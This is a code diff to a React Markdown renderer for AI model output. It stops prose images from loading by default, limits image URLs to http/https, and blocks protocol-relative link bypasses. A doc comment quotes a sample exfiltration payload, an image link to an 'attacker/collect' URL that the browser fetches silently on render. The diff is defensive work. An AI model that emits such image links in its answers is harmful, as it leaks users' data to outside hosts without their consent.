@@ -3,6 +3,8 @@
 import * as React from 'react';
 import { marked, type Token, type Tokens } from 'marked';
 
+import { viewableUrl } from '../core/native-content';
+import { useProseImages, type ProseImages } from './result-env';
 import { cn } from './utils';
 
 /**
@@ -53,16 +55,37 @@ const LEX_OPTIONS = { gfm: true, breaks: true } as const;
 export interface MarkdownProps {
   text: string;
   className?: string;
+  /**
+   * What an image in this text does. Defaults to the surrounding
+   * `ResultEnvProvider`'s `proseImages`, and to `'link'` outside one — see
+   * {@link ProseImages} for why the default is not to load.
+   */
+  proseImages?: ProseImages;
 }
 
-export function Markdown({ text, className }: MarkdownProps) {
+export function Markdown({ text, className, proseImages }: MarkdownProps) {
   const tokens = React.useMemo(() => marked.lexer(text, LEX_OPTIONS), [text]);
+  const fromEnv = useProseImages();
+  // The prop wins over the provider, so a host rendering one prose value its own
+  // way does not have to nest a second provider to say so.
+  const mode = proseImages ?? fromEnv;
   return (
-    <div className={cn('space-y-2 text-[13px] leading-relaxed text-foreground', className)}>
-      <Blocks tokens={tokens} />
-    </div>
+    <ProseImagesContext value={mode}>
+      <div className={cn('space-y-2 text-[13px] leading-relaxed text-foreground', className)}>
+        <Blocks tokens={tokens} />
+      </div>
+    </ProseImagesContext>
   );
 }
+
+/**
+ * The policy, threaded to the one token that needs it.
+ *
+ * A context rather than a prop on every walker: `Block`, `Inline` and
+ * `InlineToken` recurse through each other, and passing a value only the `image`
+ * arm reads through all three would put it in every signature in the file.
+ */
+const ProseImagesContext = React.createContext<ProseImages>('link');
 
 const HEADING_CLASS: Record<number, string> = {
   1: 'text-[16px] font-semibold',
@@ -282,36 +305,119 @@ function InlineToken({ token }: { token: Token }) {
       // is a security decision.
       if (!href) return <Inline tokens={link.tokens} />;
       return (
-        <a
-          href={href}
-          target="_blank"
-          // `noreferrer` as well as `noopener`: a result view has no business
-          // telling a third party which page it was opened from.
-          rel="noreferrer noopener"
-          className="underline underline-offset-2"
-        >
-          <Inline tokens={link.tokens} />
-        </a>
+        // The flag is set for everything under the anchor, so a nested `image`
+        // token knows not to open one of its own — see {@link ProseImage}.
+        <InsideLinkContext value={true}>
+          <a
+            href={href}
+            target="_blank"
+            // `noreferrer` as well as `noopener`: a result view has no business
+            // telling a third party which page it was opened from.
+            rel="noreferrer noopener"
+            className="underline underline-offset-2"
+          >
+            <Inline tokens={link.tokens} />
+          </a>
+        </InsideLinkContext>
       );
     }
-    case 'image': {
-      const image = token as Tokens.Image;
-      const src = safeHref(image.href);
-      if (!src) return <>{image.text}</>;
-      return <img src={src} alt={image.text} className="max-w-full rounded-md" />;
-    }
+    case 'image':
+      return <ProseImage token={token as Tokens.Image} />;
     default:
       return <>{rawOf(token)}</>;
   }
 }
 
-/** A `javascript:` href is an execution path; only these three are followed. */
+/**
+ * An image in model output, which by default is a link rather than a fetch.
+ *
+ * `![](https://attacker/collect?…)` is a request the browser makes as the result
+ * is PAINTED — before anyone has read a word, with no click and no consent — so
+ * a view whose entire content is model output had an open channel in it. As a
+ * link, the alt text (or the URL, when the model wrote no alt) still says what
+ * the model put there, and the fetch waits for a reader who wants it.
+ *
+ * A host that knows where its prose images come from opts in with
+ * `proseImages: 'load'`. Either way the scheme must be `http:` or `https:`: a
+ * `data:` image is refused outright even for a type the file arms would paint,
+ * because a model's answer is not where an inline image arrives.
+ *
+ * **Inside a link it stays text, because `[![alt](img)](href)` is a link token
+ * holding an image token** — the linked-thumbnail spelling, which models write
+ * constantly. An anchor inside an anchor is not valid HTML: the parser un-nests
+ * the pair into siblings, so a server-rendered page and the hydrated tree
+ * disagree, and the link the author wrote points at the image instead of the
+ * destination. An `<img>` nests inside an anchor perfectly well, so only the
+ * link arm has to care.
+ */
+function ProseImage({ token }: { token: Tokens.Image }) {
+  const mode = React.use(ProseImagesContext);
+  const insideLink = React.use(InsideLinkContext);
+  const src = proseImageUrl(token.href);
+  // A refused scheme keeps its TEXT, exactly as a refused link does: dropping
+  // the element and dropping the words are different things.
+  if (!src) return <>{token.text}</>;
+  if (mode === 'load') {
+    return (
+      <img
+        src={src}
+        alt={token.text}
+        referrerPolicy="no-referrer"
+        className="max-w-full rounded-md"
+      />
+    );
+  }
+  // The enclosing anchor already carries a destination and a click; this is its
+  // label. Falling back to the URL keeps that label from being empty.
+  if (insideLink) return <>{token.text || src}</>;
+  return (
+    <a
+      href={src}
+      target="_blank"
+      rel="noreferrer noopener"
+      className="underline underline-offset-2"
+    >
+      {token.text || src}
+    </a>
+  );
+}
+
+/**
+ * Whether the walker is already inside an anchor.
+ *
+ * A context for the same reason the policy above is one: `Block`, `Inline` and
+ * `InlineToken` recurse through each other, and a flag only the `image` arm
+ * reads would otherwise sit in every signature in the file.
+ */
+const InsideLinkContext = React.createContext(false);
+
+/** An image URL a prose value may reach: the two network schemes, nothing else. */
+function proseImageUrl(href: string): string | undefined {
+  const url = viewableUrl(href);
+  // Narrower than the kernel gate on purpose. `viewableUrl` also accepts a
+  // same-origin path, a `blob:` and an allow-listed `data:` - none of which a
+  // model's prose has any business naming.
+  return url && /^https?:/.test(url) ? url : undefined;
+}
+
+/**
+ * A `javascript:` href is an execution path; only these are followed.
+ *
+ * Link policy is deliberately wider than image policy, because a link needs a
+ * CLICK. Which hosts a reader may be sent to is the host's allow-list to keep,
+ * not this package's.
+ */
 function safeHref(href: string): string | undefined {
   const trimmed = href.trim();
   if (/^(https?:|mailto:)/i.test(trimmed)) return trimmed;
-  // A relative or anchor link is same-origin by construction and carries no
-  // scheme to abuse.
-  if (/^[#/]/.test(trimmed)) return trimmed;
+  // A fragment names a position in THIS document and carries no scheme at all.
+  if (trimmed.startsWith('#')) return trimmed;
+  // A path looks same-origin and need not be: `//host/x` is protocol-relative,
+  // and the URL parser reads `/\host/x` the same way. The kernel gate settles it
+  // by resolving against a sentinel origin and asking whether it stayed there,
+  // which is one rule where this file used to have a prefix test that passed
+  // both spellings.
+  if (trimmed.startsWith('/')) return viewableUrl(trimmed);
   return undefined;
 }
 
